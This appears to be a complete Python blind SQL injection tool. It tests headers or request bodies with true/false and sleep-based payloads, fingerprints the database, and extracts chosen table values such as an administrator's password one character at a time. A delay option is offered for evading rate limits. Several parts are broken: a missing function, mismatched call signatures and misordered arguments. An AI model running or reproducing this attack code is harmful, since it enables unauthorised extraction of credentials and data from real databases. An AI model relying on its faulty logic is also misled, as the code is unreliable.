import time
import requests
import string
import argparse
import json
import os
from urllib.parse import quote

CHARSET = string.ascii_letters + string.digits + string.punctuation + " "

def load_version_queries():
    file_path = os.path.join(os.path.dirname(__file__), 'version_queries.json')
    try:
        with open(file_path, 'r') as file:
            version_queries = json.load(file)
        return version_queries
    except Exception as e:
        print(f"Error loading version queries: {e}")
        return {}

version_queries = load_version_queries()

def is_injectable(url, request_template=None, injectable_headers={}, static_headers={}, args=None):
    """
    Check if the field is injectable by testing with simple SQL payloads.
    First, compare the status codes, and if they are identical, compare the content length.
    If keywords are provided, override the other detection methods and use keyword comparison.
    """
    test_payloads = {
        "true_condition": "' AND '1'='1",
        "false_condition": "' AND '1'='2"
    }

    true_response_content = ""
    false_response_content = ""
    true_status_code = None
    false_status_code = None

    for condition, payload in test_payloads.items():
        encoded_payload = quote(payload)

        if args.verbose:
            print(f"[VERBOSE] Testing condition: {condition}")
            print(f"[VERBOSE] Payload: {payload} | Encoded Payload: {encoded_payload}")
        
        try:
            response, response_time = injection(
                url=url, 
                encoded_payload=encoded_payload, 
                request_template=request_template, 
                injectable_headers=injectable_headers, 
                static_headers=static_headers, 
                args=args
                )
            
            if not response:
                return None, None
            
            if args.delay > 0:
                if args.verbose:
                    print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
                time.sleep(args.delay)

            if condition == "true_condition":
                true_status_code = response.status_code
                true_response_content = response.text
            elif condition == "false_condition":
                false_status_code = response.status_code
                false_response_content = response.text

            if args.verbose:
                print(f"[VERBOSE] Sent request with payload: {encoded_payload}")
                print(f"[VERBOSE] Response status: {response.status_code}, length: {len(response.text)}")
                print(f"[VERBOSE] Request time: {response_time} seconds")
                print(f"[VERBOSE] Response Headers: {response.headers}")

        except requests.exceptions.RequestException as e:
            print(f"[-] Error during {condition} injection request: {e}")
            return None, None

    # Step 1: Keywords
    if args.true_keywords or args.false_keywords:
        if args.true_keywords:
            if any(keyword in true_response_content for keyword in args.true_keywords):
                print("[+] Keyword(s) detected in true condition response. header is likely injectable!")
                return True, "keyword"
            else:
                print("[-] No true keywords found in response.")
                return None, None

        if args.false_keywords:
            if any(keyword in false_response_content for keyword in args.false_keywords):
                print("[+] Keyword(s) detected in false condition response.")
                return True, "keyword"
            else:
                print("[-] No false keywords found in response.")
                return None, None

        return False, None
        print (f"[-] Keyword detection failed.")

    # Step 2: Status codes
    if true_status_code != false_status_code:
        print(f"[+] Status code difference detected (true: {true_status_code}, false: {false_status_code}). header is likely injectable!")
        return True, "status"

    # Step 3: Content length
    true_content_length = len(true_response_content)
    false_content_length = len(false_response_content)
    
    if true_content_length != false_content_length:
        print(f"[+] Content length difference detected (true: {true_content_length}, false: {false_content_length}). header is likely injectable!")
        if args.verbose:
            print(f"[VERBOSE] True response length: {true_content_length} | False response length: {false_content_length}")
        return True, "content"

    print("[-] No significant status code, content length, or keyword differences detected. header is likely not injectable.")
    return False, None

def detect_database(url, request_template=None, injectable_headers={}, static_headers={}, detection="status", args=None):
    """
    Attempt to detect the database type by executing various version queries.
    Use keyword comparison if keywords are provided, otherwise use the selected detection method (status, content length, sleep, or keywords).
    If no other detection methods work, use sleep-based detection as a last resort.
    """
    print("[*] Attempting to detect the database type...")

    if args.verbose:
        if not args.sleep_only:
            print(f"[VERBOSE] Detection method: {detection}")

    # Sleep-only detection
    if args.sleep_only:
        return sleep_based_detection(url, request_template, injectable_headers, static_headers, args)

    # Step 1: Baseline request
    if args.verbose:
        print(f"[VERBOSE] Sending baseline request...")
    
    try:
        response, baseline_status_code, baseline_content_length, response_time = send_baseline_request(
            url, request_template, injectable_headers, static_headers, args
        )
    except requests.exceptions.RequestException as e:
        print(f"[-] Error during baseline request: {e}")
        return None, None

    # Step 2: Version queries
    if args.verbose:
        print(f"[VERBOSE] Sending version queries to detect database...")

    for db_name, info in version_queries.items():
        query = info["version_query"]
        payload = f"' AND ({query})"
        encoded_payload = quote(payload)

        if args.verbose:
            print(f"[VERBOSE] Querying Database: {db_name} with payload: {encoded_payload}")

        try:
            response, response_time = injection(
                url=url,
                encoded_payload=encoded_payload,
                request_template=request_template,
                injectable_headers=injectable_headers,
                static_headers=static_headers,
                args=args
            )

            if not response:
                return None, None

            if args.delay > 0:
                if args.verbose:
                    print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
                time.sleep(args.delay)

            if detection == "keyword":
                if args.true_keywords and any(keyword in response.text for keyword in args.true_keywords):
                    print(f"[+] True keyword(s) detected in response. Database likely: {db_name}")
                    return db_name, info.get("substring_function", None)
                if args.false_keywords and any(keyword in response.text for keyword in args.false_keywords):
                    print(f"[+] False keyword(s) detected in response. Database likely: {db_name}")
                    return db_name, info.get("substring_function", None)
            elif detection == "status":
                if response.status_code != baseline_status_code:
                    print(f"[+] Database detected: {db_name} (status code changed: {response.status_code})")
                    return db_name, info.get("substring_function", None)
            elif detection == "content":
                response_content_length = len(response.text)
                if response_content_length != baseline_content_length:
                    print(f"[+] Database detected: {db_name} (content length changed: {response_content_length})")
                    return db_name, info.get("substring_function", None)

        except requests.exceptions.RequestException as e:
            print(f"[-] Error during database detection for {db_name}: {e}")

    # Step 3: Sleep-based detection as a fallback
    print("[*] Fallback: Attempting sleep based detection...")
    return sleep_based_detection(url, request_template, injectable_headers, static_headers, args)

def extract_data(url, table, column, where_clause, string_function, position, db_name, data_length, request_template=None, injectable_headers={}, static_headers={}, extraction="status", args=None):
    """
    Perform blind SQL injection to extract the data character by character.
    Use the selected extraction method to determine a successful extraction (status code, content length, sleep, or keywords).
    Fallback to sleep-based detection if all other methods fail.
    """

    extracted_data = ""

    if args.verbose:
        print(f"[VERBOSE] Starting data extraction for {table}.{column}...")
        print(f"[VERBOSE] WHERE clause: {where_clause}")
        if not args.sleep_only:
            print(f"[VERBOSE] Extraction method: {extraction}")

    # Use helper function to send baseline request
    try:
        response, baseline_status_code, baseline_content_length, _ = send_baseline_request(
            url, request_template, injectable_headers, static_headers, args
        )
    except requests.exceptions.RequestException as e:
        print(f"[-] Error during baseline request: {e}")
        return extracted_data

    # Step 1: Iterate through possible characters until data_length is reached
    while position <= data_length:
        found_char = False
        for char in CHARSET:
            result = extract_character(
                url, table, column, where_clause, string_function, position, char, 
                request_template, injectable_headers, static_headers, 
                extraction, baseline_status_code, baseline_content_length, args
            )

            if result:
                extracted_data += result
                print(f"Character found: {char} at position {position}")
                position += 1
                found_char = True
                break

        # If no character was found, check sleep-based extraction as a fallback
        if not found_char:
            print("[*] Fallback: Attempting sleep-based extraction...")
            for char in CHARSET:
                result = sleep_based_extraction(
                    url, table, column, where_clause, string_function, position, 
                    char, request_template, injectable_headers, static_headers, db_name, args
                )
                
                if result:
                    extracted_data += result
                    position += 1
                    found_char = True
                    break

            if not found_char:
                print(f"Data extraction complete: {extracted_data}")
                break

    return extracted_data

def load_request_template(file_path):
    """
    Load the HTTP request from a file. The file should contain the placeholder 'INJECT' where the payload should go.
    """
    try:
        with open(file_path, 'r') as f:
            file_content = f.read()
        return parse_request_file(file_content)
    except Exception as e:
        print(f"[-] Error reading request file: {e}")
        return None, None, None, None

def parse_request_template(file_content):
    """
    Parse a raw HTTP request file and return method, URL, headers, and body.
    """
    lines = file_content.splitlines()
    
    if not lines:
        raise ValueError("The request file content is empty")

    request_line = lines[0].strip()
    
    try:
        method, url, _ = request_line.split(' ', 2)
    except ValueError:
        raise ValueError("Invalid request line: Unable to parse method and URL")
    
    headers = {}
    body = ""
    is_body = False

    for line in lines[1:]:
        line = line.strip()

        if not line and not is_body:
            is_body = True
            continue

        if is_body:
            body += line + "\n" if line else ""
        else:
            if ': ' in line:
                key, value = line.split(':', 1)
                headers[key.strip()] = value.strip()
            else:
                raise ValueError(f"Invalid header format: {line}")

    body = body.rstrip("\n")
    return method, url, headers, body

def send_request(url=None, headers=None, data=None, method="GET", args=None):
    """
    Send an HTTP request using the parsed information.
    """
    try:
        if method == "POST":
            response = requests.post(url, headers=headers, data=data, timeout=args.timeout)
        elif method == "PUT":
            response = requests.put(url, headers=headers, data=data, timeout=args.timeout)
        elif method == "PATCH":
            response = requests.patch(url, headers=headers, data=data, timeout=args.timeout)
        elif method == "GET":
            response = requests.get(url, headers=headers, timeout=args.timeout)
        elif method == "DELETE":
            response = requests.delete(url, headers=headers, timeout=args.timeout)
        elif method == "HEAD":
            response = requests.head(url, headers=headers, timeout=args.timeout)
        elif method == "OPTIONS":
            response = requests.options(url, headers=headers, timeout=args.timeout)
        return response
    except requests.exceptions.RequestException as e:
        print(f"[-] Error during {method} request: {e}")
        return None

def injection(url, encoded_payload, request_template, injectable_headers, static_headers, args):
    """
    Prepares the request by injecting the payload into the request template or headers and sends the request.
    Handles both GET and POST methods and returns the response, response time, and any errors encountered.
    """
    try:
        start_time = time.time()

        if request_template:
            injected_template = request_template.replace("INJECT", encoded_payload)
            method, url, headers, body = parse_request_template(injected_template)
            response = send_request(method=method, url=url, headers=headers, body=body, args=args)
        else:
            headers = {**static_headers}
            for key, value in injectable_headers.items():
                headers[key] = value + encoded_payload
            if args.data:
                response = requests.post(url, headers=headers, data=args.data, timeout=args.timeout)
            else:
                response = requests.get(url, headers=headers, timeout=args.timeout)

        end_time = time.time()
        response_time = end_time - start_time

        if args.verbose:
            print(f"[VERBOSE] Sent request with payload: {encoded_payload}")
            print(f"[VERBOSE] Response status: {response.status_code}, length: {len(response.text)}")
            print(f"[VERBOSE] Request time: {response_time} seconds")
            print(f"[VERBOSE] Response Headers: {response.headers}")

        return response, response_time
        
    except requests.exceptions.RequestException as e:
        print(f"[-] Error during request: {e}")
        return None, None

def send_baseline_request(url, request_template, injectable_headers, static_headers, args):
    """
    Send the baseline request and return the response, status code, content length, and response time.
    """
    start_time = time.time()

    if request_template:
        method, url, headers, body = parse_request_template(request_template)
        response = send_request(method=method, url=url, headers=headers, body=body, args=args)
    else:
        headers = {**static_headers, **injectable_headers}
        if args.data:
            response = requests.post(url, headers=headers, data=args.data, timeout=args.timeout)
        else:
            response = requests.get(url, headers=headers, timeout=args.timeout)

    end_time = time.time()
    baseline_status_code = response.status_code
    baseline_content_length = len(response.text)
    response_time = end_time - start_time

    if args.verbose:
        print(f"[VERBOSE] Baseline response status: {baseline_status_code}, content length: {baseline_content_length}")
        print(f"[VERBOSE] Response time: {response_time} seconds")

    return response, baseline_status_code, baseline_content_length, response_time

def sleep_based_detection(db_name, sleep_query, url, request_template, injectable_headers, static_headers, args):
    """
    Helper function to handle sleep-based detection for a given database.
    Only attempts detection if a valid sleep function exists.
    """
    if not sleep_query or sleep_query == "N/A":
        print(f"[-] Sleep function not applicable or not found for {db_name}. Skipping...")
        return None, None

    for db_specific, sleep_function in sleep_query.items():
        if not sleep_function or sleep_function == "N/A":
            print(f"[-] Sleep function for {db_specific} in {db_name} is not applicable or not found. Skipping...")
            continue

        payload = f"' AND {sleep_function}"
        encoded_payload = quote(payload)

        if args.verbose:
            print(f"[VERBOSE] Querying Database: {db_name} with payload: {encoded_payload}")

        try:
            response, response_time = injection(
                url=url,
                encoded_payload=encoded_payload,
                request_template=request_template,
                injectable_headers=injectable_headers,
                static_headers=static_headers,
                args=args
            )

            if not response:
                return None, None

            if response_time > 5:
                print(f"[+] Sleep-based detection: Database detected as {db_name}")
                return db_name, version_queries[db_name].get("substring_function", None)

            if args.delay > 0:
                if args.verbose:
                    print(f"[VERBOSE] Delaying requests for {args.delay} seconds...")
                time.sleep(args.delay)

        except requests.exceptions.RequestException as e:
            print(f"[-] Error during sleep-based detection for {db_name}: {e}")

    return None, None

def discover_data_length(url, table, column, where_clause, db_name, detection, max_length=100, request_template=None, injectable_headers={}, static_headers={}, args=None):
    """
    Helper function to discover the length of the data to extract using the appropriate length function
    from the version_queries.json for the detected database.
    It returns the length of the data if found, or None if unsuccessful.
    """

    if db_name not in version_queries:
        print(f"[-] Database {db_name} not found in version queries.")
        return None

    length_function = version_queries[db_name].get("length_function", None)
    if not length_function or length_function == "N/A":
        print(f"[-] Length function not found for {db_name}.")
        return None

    if args.verbose:
        print(f"[VERBOSE] Attempting to discover the length of the data for {table}.{column} using {length_function}...")

    # Step 1: Send baseline request
    try:
        response, baseline_status_code, baseline_content_length, _ = send_baseline_request(
            url, request_template, injectable_headers, static_headers, args
        )
    except requests.exceptions.RequestException as e:
        print(f"[-] Error during baseline request: {e}")
        return None

    # Step 2: Iterate over possible lengths
    for length in range(1, max_length + 1):
        payload = f"' AND {length_function}((SELECT {column} FROM {table} WHERE {where_clause})) = {length}"
        encoded_payload = quote(payload)

        try:
            response, _ = injection(
                url=url,
                encoded_payload=encoded_payload,
                request_template=request_template,
                injectable_headers=injectable_headers,
                static_headers=static_headers,
                args=args
            )

            if not response:
                return None

            if args.verbose:
                print(f"[VERBOSE] Sent request with payload to discover length: {encoded_payload}")
                print(f"[VERBOSE] Response status: {response.status_code}, content length: {len(response.text)}")

            if detection == "keyword":
                if args.true_keywords and any(keyword in response.text for keyword in args.true_keywords):
                    print(f"[+] Data length discovered: {length}")
                    return length
            elif detection == "status":
                if response.status_code != baseline_status_code:
                    print(f"[+] Data length discovered: {length} (Status code changed: {response.status_code})")
                    return length
            elif detection == "content":
                if len(response.text) != baseline_content_length:
                    print(f"[+] Data length discovered: {length} (Content length changed: {len(response.text)})")
                    return length

        except requests.exceptions.RequestException as e:
            print(f"[-] Error during length discovery: {e}")
            return None

    print(f"[-] Failed to discover data length within the maximum length {max_length}. Proceeding without a determined length.")
    return None

def extract_character(url, table, column, where_clause, string_function, position, char, request_template, injectable_headers, static_headers, extraction, baseline_status_code, baseline_content_length, args):
    """
    Handles character extraction using status code, content length, or keyword-based detection methods.
    """
    payload = (f"' AND {string_function}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, 1) = '{char}")
    encoded_payload = quote(payload)

    try:
        response, response_time = injection(
            url=url,
            encoded_payload=encoded_payload,
            request_template=request_template,
            injectable_headers=injectable_headers,
            static_headers=static_headers,
            args=args
        )

        if not response:
            return None

        if args.delay > 0:
            if args.verbose:
                print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
            time.sleep(args.delay)

        if extraction == "keyword":
            if args.true_keywords and any(keyword in response.text for keyword in args.true_keywords):
                return char
            if args.false_keywords and any(keyword in response.text for keyword in args.false_keywords):
                return None
        elif extraction == "status":
            if response.status_code != baseline_status_code:
                return char
        elif extraction == "content":
            response_content_length = len(response.text)
            if response_content_length != baseline_content_length:
                return char

    except requests.exceptions.RequestException as e:
        print(f"[-] Error during character extraction for character {char}: {e}")
        return None

    return None

def sleep_based_extraction(url, table, column, where_clause, string_function, position, char, request_template, injectable_headers, static_headers, db_name, args):
    """
    Handles the sleep-based character extraction.
    """
    sleep_function = version_queries[db_name].get("sleep_function", None)
    if sleep_function:
        for db_specific, sleep_query in sleep_function.items():
            payload = f"' AND {sleep_query} AND {string_function}((SELECT {column} FROM {table} WHERE {where_clause}), {position}, 1) = '{char}"
            encoded_payload = quote(payload)

            try:
                response, response_time = injection(
                    url=url,
                    encoded_payload=encoded_payload,
                    request_template=request_template,
                    injectable_headers=injectable_headers,
                    static_headers=static_headers,
                    args=args
                )

                if not response:
                    return None

                if response_time > 5:
                    print(f"[+] Sleep-based character found: {char} at position {position}")
                    if args.delay > 0:
                        if args.verbose:
                            print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
                        time.sleep(args.delay)
                    return char

            except requests.exceptions.RequestException as e:
                print(f"[-] Error during sleep-based extraction for character {char}: {e}")

    return None

def main():
    parser = argparse.ArgumentParser(description="Blind SQL Injection Script with header and File Support")

    parser.add_argument('-u', '--url', required=False, help="Target URL")
    parser.add_argument('-ih', '--injectable-headers', action='append', nargs=2, metavar=('key', 'value'), help="Injectable headers as key-value pairs (e.g., -ih Referer http://www.example.com -ih X-Fowarded-For 127.0.0.1)")
    parser.add_argument('-sh', '--static-header', action='append', nargs=2, metavar=('key', 'value'), help="Static headers as key-value pairs that do not contain payloads (e.g., -sh session_id abcdefg12345abababab123456789012)")
    parser.add_argument('-d','--data', required=False, help="Specify data to be sent in the request body. Changes request type to POST.")
    parser.add_argument('-f', '--file', required=False, help="File containing the HTTP request with 'INJECT' placeholder for payloads")
    parser.add_argument('-t', '--table', required=False, help="Table name from which to extract the data")
    parser.add_argument('-c', '--column', required=False, help="Column name to extract (e.g., Password)")
    parser.add_argument('-w', '--where', required=False, help="WHERE clause (e.g., Username = 'Administrator')")
    parser.add_argument('-m', '--max-length', type=int, default=100, help="Maximum length of the extracted data that the script will check for (default: 100)")
    parser.add_argument('--delay', type=float, default=0, help="Delay in seconds between requests to bypass rate limiting")
    parser.add_argument('--verbose', action='store_true', help="Enable verbose output for debugging")
    parser.add_argument('--true-keywords', nargs='+', help="Keywords to search for in the true condition (e.g., 'Welcome', 'Success')")
    parser.add_argument('--false-keywords', nargs='+', help="Keywords to search for in the false condition (e.g., 'Error', 'Invalid')")
    parser.add_argument('--sleep-only', action='store_true', help="Use only sleep-based detection methods")
    parser.add_argument('--timeout', type=int, default=10, help="Timeout for each request in seconds")

    args = parser.parse_args()

    if not args.url and not args.file:
        print("[-] You must provide either a URL (-u) or a request file (-f).")
        return
    if args.url and not (args.injectable_headers or args.data):
        print("[-] You must provide either injectable headers (-ih) or data to be sent in the request body (-d) when specifying a URL.")
        return
    if (args.injectable_headers or args.data or args.file) and not (args.table and args.column and args.where):
        print("[-] You must provide a column (-c), table (-t), and where clause (-w) for data extractrion.")
        return
    if args.data and args.file:
        print ("[-] You cannot specify data for the request file outside of the request file.")
        return

    injectable_headers = dict(args.injectable_headers) if args.injectable_headers else {}
    static_headers = dict(args.static_header) if args.static_header else {}

    request_template = None
    if args.file:
        request_template = load_request_template(args.file)
        if not request_template:
            return

    if not args.url and not request_template:
        print("[-] A valid request template or URL must be provided.")
        return

    # Step 1: Check if the header is injectable
    injectable, detection = is_injectable(args.url, injectable_headers, static_headers, request_template, args=args)
    if not injectable:
        return

    print(f"[+] header is injectable using {detection} method.")
    print("[+] Checking database type and corresponding substring function...")

    # Step 2: Detect the database type
    db_type, string_function = detect_database(args.url, injectable_headers, static_headers, request_template, detection=detection, args=args)

    if not db_type:
        print("[-] Unable to detect database type.")
        return
    elif not string_function:
        print(f"[*] Database {db_type} detected, but substring operations are not applicable.")
        return

    # Step 3: Extract the data
    extracted_data = ""

    data_length = discover_data_length(
        url=args.url,
        table=args.table,
        column=args.column,
        where_clause=args.where,
        db_name=db_type,
        detection=detection,
        max_length=args.max_length,
        request_template=request_template,
        injectable_headers=injectable_headers,
        static_headers=static_headers,
        args=args
    )

    if data_length:
        print(f"[+] Data length to extract: {data_length}")
    else:
        print("[-] Unable to determine data length. Proceeding with extraction anyway.")

    extracted_data = extract_data(
        url=args.url, 
        table=args.table, 
        column=args.column, 
        where_clause=args.where, 
        string_function=string_function, 
        position=1,  # Start from position 1
        db_name=db_type,
        data_length=data_length,  # Pass the data_length here
        request_template=request_template,
        injectable_headers=injectable_headers,
        static_headers=static_headers,
        extraction=detection,  # Pass detection method here
        args=args
    )
    print(f"Extracted data: {extracted_data}")

if __name__ == "__main__":
    main()
